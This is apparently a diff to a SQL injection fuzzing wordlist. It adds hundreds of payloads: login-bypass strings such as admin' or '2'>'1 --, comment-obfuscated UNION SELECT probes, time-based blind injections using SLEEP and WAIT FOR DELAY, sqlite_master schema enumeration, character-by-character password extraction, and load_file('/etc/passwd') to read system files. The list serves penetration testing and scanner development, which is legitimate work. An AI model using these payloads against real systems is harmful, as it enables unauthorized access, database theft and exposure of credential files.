+SELECT/**/CONCAT(CHAR(72),CHAR(65),CHAR(67),CHAR(75),CHAR(69),CHAR(82))/**/--/**/-
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
 UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
 UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
+WAIT FOR DELAY '00:00:15'
 [
 [[
 []
@@ -910,6 +2425,18 @@ admin' or '1'='1
 admin' or '1'='1'#
 admin' or '1'='1'--
 admin' or '1'='1'/*
+admin' or '2'>'1
+admin' or '2'>'1 --
+admin' or '2'>'1 -- -
+admin' or '2'>'1' or '2'>'1
+admin' or '2'>'1' or '2'>'1 --
+admin' or '2'>'1' or '2'>'1 -- -
+admin' or '2'>'1' or '2'>'1--
+admin' or '2'>'1--
+admin' or 1 or'
+admin' or 1 or' --
+admin' or 1 or' -- -
+admin' or 1 or'--
 admin' or 1=1
 admin' or 1=1#
 admin' or 1=1--
@@ -926,12 +2453,59 @@ admin') or ('1'='1
 admin') or ('1'='1'#
 admin') or ('1'='1'--
 admin') or ('1'='1'/*
+admin') or 1<2)
+admin') or 1<2) --
+admin') or 1<2) -- -
+admin') or 1<2)--
 admin') or true)
 admin') or true) --
 admin') or true) -- -
 admin') or true)--
+admin'))
+admin')) --
+admin')) -- -
+admin'))--
+admin'))/**/--
+admin'))/**/--/**/-
+admin')/**/or/**/1<2)
+admin')/**/or/**/1<2)--
+admin')/**/or/**/1<2)/**/--
+admin')/**/or/**/1<2)/**/--/**/-
 admin'/*
+admin'/**/#
+admin'/**/--
+admin'/**/or/**/'2'>'1
+admin'/**/or/**/'2'>'1'/**/or/**/'2'>'1
+admin'/**/or/**/'2'>'1'/**/or/**/'2'>'1--
+admin'/**/or/**/'2'>'1'/**/or/**/'2'>'1/**/--
+admin'/**/or/**/'2'>'1'/**/or/**/'2'>'1/**/--/**/-
+admin'/**/or/**/'2'>'1--
+admin'/**/or/**/'2'>'1/**/--
+admin'/**/or/**/'2'>'1/**/--/**/-
+admin'/**/or/**/1/**/or'
+admin'/**/or/**/1/**/or'--
+admin'/**/or/**/1/**/or'/**/--
+admin'/**/or/**/1/**/or'/**/--/**/-
 admin'or 1=1 or ''='
+admin'||1
+admin'||1 --
+admin'||1 -- -
+admin'||1#
+admin'||1--
+admin'||1/**/--
+admin'||1/**/--/**/-
+admin'||1||'1'<>'2
+admin'||1||'1'<>'2 --
+admin'||1||'1'<>'2 -- -
+admin'||1||'1'<>'2--
+admin'||1||'1'<>'2/**/--
+admin'||1||'1'<>'2/**/--/**/-
+admin’)
+admin’) --
+admin’) -- -
+admin’)--
+admin’)/**/--
+admin’)/**/--/**/-
 admin乗' OR 1=1 -- 乗'
 and 'a'<>'b'
 and 'a'='a'
@@ -955,6 +2529,12 @@ hi' or 'a'='a
 hi' or 'x'='x';
 hi' or 1=1 --
 hi') or ('a'='a
+mid((1),1,1)
+mid((1),1,1) --
+mid((1),1,1) -- -
+mid((1),1,1)--
+mid((1),1,1)/**/--
+mid((1),1,1)/**/--/**/-
 or 0=0 #
 or 0=0 #"
 or 0=0 --
@@ -1067,11 +2647,89 @@ select user from sysibm.sysdummy1;
 select version();	
 select versionnumber, version_timestamp from sysibm.sysversions;
 sleep(__TIME__)#
+strcmp(left('password',1), 0x69) = 1
+strcmp(left('password',1), 0x69) = 1 --
+strcmp(left('password',1), 0x69) = 1 -- -
+strcmp(left('password',1), 0x69) = 1--
+strcmp(left('password',1),/**/0x69)/**/=/**/1
+strcmp(left('password',1),/**/0x69)/**/=/**/1--
+strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--
+strcmp(left('password',1),/**/0x69)/**/=/**/1/**/--/**/-
+substring((1),1,1)
+substring((1),1,1) --
+substring((1),1,1) -- -
+substring((1),1,1)--
+substring((1),1,1)/**/--
+substring((1),1,1)/**/--/**/-
+un/**/ion+sel/**/ect+1
+un/**/ion+sel/**/ect+1 --
+un/**/ion+sel/**/ect+1 -- -
+un/**/ion+sel/**/ect+1,2
+un/**/ion+sel/**/ect+1,2 --
+un/**/ion+sel/**/ect+1,2 -- -
+un/**/ion+sel/**/ect+1,2,3
+un/**/ion+sel/**/ect+1,2,3 --
+un/**/ion+sel/**/ect+1,2,3 -- -
+un/**/ion+sel/**/ect+1,2,3,4
+un/**/ion+sel/**/ect+1,2,3,4 --
+un/**/ion+sel/**/ect+1,2,3,4 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5
+un/**/ion+sel/**/ect+1,2,3,4,5 --
+un/**/ion+sel/**/ect+1,2,3,4,5 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5,6
+un/**/ion+sel/**/ect+1,2,3,4,5,6 --
+un/**/ion+sel/**/ect+1,2,3,4,5,6 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7 --
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 --
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 --
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 --
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10 -- -
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9,10/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8,9/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7,8/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--
+un/**/ion+sel/**/ect+1,2,3,4,5,6,7/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3,4,5,6--
+un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--
+un/**/ion+sel/**/ect+1,2,3,4,5,6/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3,4,5--
+un/**/ion+sel/**/ect+1,2,3,4,5/**/--
+un/**/ion+sel/**/ect+1,2,3,4,5/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3,4--
+un/**/ion+sel/**/ect+1,2,3,4/**/--
+un/**/ion+sel/**/ect+1,2,3,4/**/--/**/-
+un/**/ion+sel/**/ect+1,2,3--
+un/**/ion+sel/**/ect+1,2,3/**/--
+un/**/ion+sel/**/ect+1,2,3/**/--/**/-
+un/**/ion+sel/**/ect+1,2--
+un/**/ion+sel/**/ect+1,2/**/--
+un/**/ion+sel/**/ect+1,2/**/--/**/-
+un/**/ion+sel/**/ect+1--
+un/**/ion+sel/**/ect+1/**/--
+un/**/ion+sel/**/ect+1/**/--/**/-
 uni/**/on sel/**/ect
 union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END)
 union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) --
 union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END) -- -
 union select (CASE WHEN sqlite_version() like '3.%' THEN 'here' ELSE (select ‘aaa’ from not_a_table) END)--
+union select load_file("/etc/passwd")
+union select load_file("/etc/passwd") --
+union select load_file("/etc/passwd") -- -
+union select load_file("/etc/passwd")--
 union select user from mysql.user where user = 'user' OR ascii(mid(password,1,1))=42
 union select user from mysql.user where user = 'user' OR find_in_set('2a',hex(mid(password,1,1)))=1
 union select user from mysql.user where user = 'user' OR locate(0x2a,password)=1
@@ -1083,6 +2741,10 @@ union select user from mysql.user where user = 'user' OR mid(password,1,1)=0x2a
 union select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
 union select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
 union select user from mysql.user where user = 'user' OR position(0x2a in password)=1
+union/**/select/**/load_file("/etc/passwd")
+union/**/select/**/load_file("/etc/passwd")--
+union/**/select/**/load_file("/etc/passwd")/**/--
+union/**/select/**/load_file("/etc/passwd")/**/--/**/-
 x' AND 1=(SELECT COUNT(*) FROM tabname); --
 x' AND email IS NULL; --
 x' AND members.email IS NULL; --
@@ -1107,6 +2769,5 @@ x' or 1=1 or 'x'='y
 ~
 Ã½ or 1=1 --
 â or 1=1 --
-â or 3=3 --
 ’ or ‘1’=’1
 乗' OR 1=1 -- 乗'
